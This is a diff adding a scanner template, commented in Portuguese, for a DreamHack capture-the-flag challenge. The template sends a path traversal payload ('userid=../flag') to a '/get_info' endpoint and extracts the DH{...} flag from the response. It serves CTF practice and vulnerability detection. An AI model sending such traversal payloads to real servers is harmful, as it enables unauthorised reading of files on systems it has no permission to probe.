@@ -1,0 +1,40 @@
+id: dreamhack-userid-pt   # Identificador único da regra (nome curto usado pelo scanner)
+
+info:                     # Bloco informativo com metadados da regra
+  name: DreamHack - Path Traversal no parâmetro userid   # Nome humano-legível da regra
+  author: Gemini        # Autor da regra
+  severity: high        # Severidade/gravidade atribuída ao achado (low/medium/high/critical)
+  description: |        # Descrição detalhada da regra (o pipe '|' preserva quebras de linha)
+    Detecta uma vulnerabilidade de Path Traversal no desafio DreamHack.
+    A falha ocorre no parâmetro 'userid' do endpoint '/get_info' via método POST,
+    permitindo a leitura de arquivos arbitrários no servidor, como o arquivo 'flag'.
+  tags: ctf,dreamhack,path-traversal,lfi   # Etiquetas (úteis para organização, filtros e relatórios)
+
+http:               # Lista de requisições que o scanner fará (pode conter vários cenários)
+  - method: POST        # Método HTTP a ser usado nesta requisição (POST)
+    path:               # Caminho do endpoint; pode usar variáveis (ex.: BaseURL)
+      - "{{BaseURL}}/get_info"   # URL alvo onde a requisição será enviada (variável template)
+    
+    headers:            # Cabeçalhos HTTP a incluir na requisição
+      Content-Type: "application/x-www-form-urlencoded"  # Indica envio de dados de formulário
+
+    body: "userid=../flag"   # Corpo da requisição: parámetro 'userid' com payload de Path Traversal
+
+    matchers-condition: and   # Condição lógica entre os matchers: aqui exige que todos sejam verdadeiros
+    matchers:                 # Lista de condições que validam se a resposta indica vulnerabilidade
+      - type: status          # Primeiro matcher verifica o código HTTP
+        status:
+          - 200              # Espera código 200 OK (indica resposta bem-sucedida)
+
+      - type: regex           # Segundo matcher verifica o corpo da resposta com expressão regular
+        part: body            # Parte da resposta a ser inspecionada: body (conteúdo HTML/JSON/etc)
+        regex:
+          - "(DH\\{[a-zA-Z0-9_\\-]+\\})"   # Regex que procura o formato da flag (ex.: DH{...})
+                                            # - os parênteses definem um grupo de captura
+                                            # - escape de barras necessárias para YAML/engine
+
+    extractors:              # Extratores pegam partes da resposta para exibir/armazenar
+      - type: regex          # Extrator por expressão regular
+        part: body           # Extrai do corpo da resposta
+        regex:
+          - "(DH\\{[a-zA-Z0-9_\\-]+\\})"  # Usa o grupo de captura para extrair a flag encontrada
